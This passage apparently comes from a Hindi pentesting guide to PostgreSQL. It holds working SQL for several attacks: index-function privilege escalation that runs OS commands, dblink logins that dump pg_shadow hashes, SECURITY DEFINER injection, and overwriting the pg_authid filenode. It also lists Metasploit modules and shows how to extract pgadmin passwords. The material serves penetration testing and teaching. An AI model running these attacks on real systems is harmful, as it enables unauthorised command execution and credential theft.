CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
फिर, `shell_commands_results` तालिका में निष्पादित कोड का आउटपुट होगा:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Local Login

कुछ गलत कॉन्फ़िगर किए गए postgresql उदाहरण किसी भी स्थानीय उपयोगकर्ता के लॉगिन की अनुमति दे सकते हैं, **`dblink` function** का उपयोग करके 127.0.0.1 से स्थानीय लॉगिन करना संभव है:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> ध्यान दें कि पिछले प्रश्न के काम करने के लिए **फंक्शन `dblink` का होना आवश्यक है**। यदि यह नहीं है, तो आप इसे बनाने का प्रयास कर सकते हैं
>
> ```sql
> CREATE EXTENSION dblink;
> ```

यदि आपके पास अधिक विशेषाधिकार वाले उपयोगकर्ता का पासवर्ड है, लेकिन उस उपयोगकर्ता को बाहरी IP से लॉगिन करने की अनुमति नहीं है, तो आप उस उपयोगकर्ता के रूप में प्रश्नों को निष्पादित करने के लिए निम्नलिखित फंक्शन का उपयोग कर सकते हैं:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
इस फ़ंक्शन के अस्तित्व की जांच करना संभव है:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **कस्टम परिभाषित फ़ंक्शन के साथ** SECURITY DEFINER

[**इस लेख में**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters एक postgres उदाहरण के अंदर privesc करने में सक्षम थे जो IBM द्वारा प्रदान किया गया था, क्योंकि उन्होंने **SECURITY DEFINER ध्वज के साथ यह फ़ंक्शन पाया**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

जैसा कि [**दस्तावेज़ों में समझाया गया है**](https://www.postgresql.org/docs/current/sql-createfunction.html) एक फ़ंक्शन **SECURITY DEFINER के साथ निष्पादित होता है** **उसका मालिक** **उपयोगकर्ता के विशेषाधिकारों के साथ**। इसलिए, यदि फ़ंक्शन **SQL Injection के लिए संवेदनशील है** या कुछ **विशेषाधिकार प्राप्त क्रियाएँ कर रहा है जिनके पैरामीटर हमलावर द्वारा नियंत्रित हैं**, तो इसका दुरुपयोग करके **postgres के अंदर विशेषाधिकार बढ़ाए जा सकते हैं**।

पिछले कोड की पंक्ति 4 में आप देख सकते हैं कि फ़ंक्शन में **SECURITY DEFINER** ध्वज है।
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
और फिर **कमांड निष्पादित करें**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQL के साथ पास बर्टफोर्स

**PL/pgSQL** एक **पूर्ण विशेषताओं वाली प्रोग्रामिंग भाषा** है जो SQL की तुलना में अधिक प्रक्रियात्मक नियंत्रण प्रदान करती है। यह **लूप** और अन्य **नियंत्रण संरचनाओं** का उपयोग करके प्रोग्राम लॉजिक को बढ़ाने की अनुमति देती है। इसके अलावा, **SQL कथन** और **ट्रिगर्स** उन फ़ंक्शनों को कॉल करने की क्षमता रखते हैं जो **PL/pgSQL भाषा** का उपयोग करके बनाई गई हैं। यह एक अधिक व्यापक और बहुपरकारी दृष्टिकोण की अनुमति देता है डेटाबेस प्रोग्रामिंग और स्वचालन के लिए।\
**आप इस भाषा का दुरुपयोग कर सकते हैं ताकि PostgreSQL से उपयोगकर्ता क्रेडेंशियल्स को बर्टफोर्स करने के लिए कहा जा सके।**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### आंतरिक PostgreSQL तालिकाओं को ओवरराइट करके प्रिवेस्क

> [!NOTE]
> निम्नलिखित प्रिवेस्क वेक्टर विशेष रूप से सीमित SQLi संदर्भों में उपयोगी है, क्योंकि सभी चरणों को नेस्टेड SELECT कथनों के माध्यम से किया जा सकता है

यदि आप **PostgreSQL सर्वर फ़ाइलों को पढ़ और लिख सकते हैं**, तो आप **एक सुपरयूजर** बन सकते हैं PostgreSQL के ऑन-डिस्क फ़ाइलनोड को ओवरराइट करके, जो आंतरिक `pg_authid` तालिका से संबंधित है।

**इस तकनीक** के बारे में अधिक पढ़ें [**यहां**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**।**

हमले के चरण हैं:

1. PostgreSQL डेटा निर्देशिका प्राप्त करें
2. `pg_authid` तालिका से संबंधित फ़ाइलनोड के लिए एक सापेक्ष पथ प्राप्त करें
3. `lo_*` फ़ंक्शनों के माध्यम से फ़ाइलनोड डाउनलोड करें
4. `pg_authid` तालिका से संबंधित डेटा प्रकार प्राप्त करें
5. [PostgreSQL फ़ाइलनोड संपादक](https://github.com/adeadfed/postgresql-filenode-editor) का उपयोग करें [फ़ाइलनोड संपादित करने के लिए](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); सभी `rol*` बूलियन फ्लैग को पूर्ण अनुमतियों के लिए 1 पर सेट करें।
6. संपादित फ़ाइलनोड को `lo_*` फ़ंक्शनों के माध्यम से फिर से अपलोड करें, और डिस्क पर मूल फ़ाइल को ओवरराइट करें
7. _(वैकल्पिक)_ एक महंगा SQL क्वेरी चलाकर इन-मेमोरी तालिका कैश को साफ़ करें
8. अब आपके पास पूर्ण सुपरadmin के अधिकार होने चाहिए।

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

_**postgresql.conf**_ फ़ाइल के अंदर आप निम्नलिखित को बदलकर postgresql लॉग सक्षम कर सकते हैं:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
फिर, **सेवा को पुनः प्रारंभ करें**।

### pgadmin

[pgadmin](https://www.pgadmin.org) PostgreSQL के लिए एक प्रशासन और विकास प्लेटफ़ॉर्म है।\
आप _**pgadmin4.db**_ फ़ाइल के अंदर **पासवर्ड** पा सकते हैं।\
आप उन्हें स्क्रिप्ट के अंदर _**decrypt**_ फ़ंक्शन का उपयोग करके डिक्रिप्ट कर सकते हैं: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

PostgreSQL में क्लाइंट प्रमाणीकरण एक कॉन्फ़िगरेशन फ़ाइल के माध्यम से प्रबंधित किया जाता है जिसे **pg_hba.conf** कहा जाता है। इस फ़ाइल में रिकॉर्ड की एक श्रृंखला होती है, प्रत्येक एक कनेक्शन प्रकार, क्लाइंट IP पता रेंज (यदि लागू हो), डेटाबेस नाम, उपयोगकर्ता नाम, और मेल खाने वाले कनेक्शनों के लिए उपयोग की जाने वाली प्रमाणीकरण विधि को निर्दिष्ट करता है। पहला रिकॉर्ड जो कनेक्शन प्रकार, क्लाइंट पता, अनुरोधित डेटाबेस, और उपयोगकर्ता नाम से मेल खाता है, प्रमाणीकरण के लिए उपयोग किया जाता है। यदि प्रमाणीकरण विफल होता है तो कोई बैकअप या फॉलबैक नहीं होता है। यदि कोई रिकॉर्ड मेल नहीं खाता है, तो पहुँच अस्वीकृत कर दी जाती है।

pg_hba.conf में उपलब्ध पासवर्ड-आधारित प्रमाणीकरण विधियाँ **md5**, **crypt**, और **password** हैं। ये विधियाँ पासवर्ड के संचरण के तरीके में भिन्न होती हैं: MD5-हैश किया हुआ, क्रिप्ट-एन्क्रिप्टेड, या स्पष्ट-टेक्स्ट। यह ध्यान रखना महत्वपूर्ण है कि क्रिप्ट विधि का उपयोग उन पासवर्ड के साथ नहीं किया जा सकता है जो pg_authid में एन्क्रिप्ट किए गए हैं।

{{#include ../banners/hacktricks-training.md}}
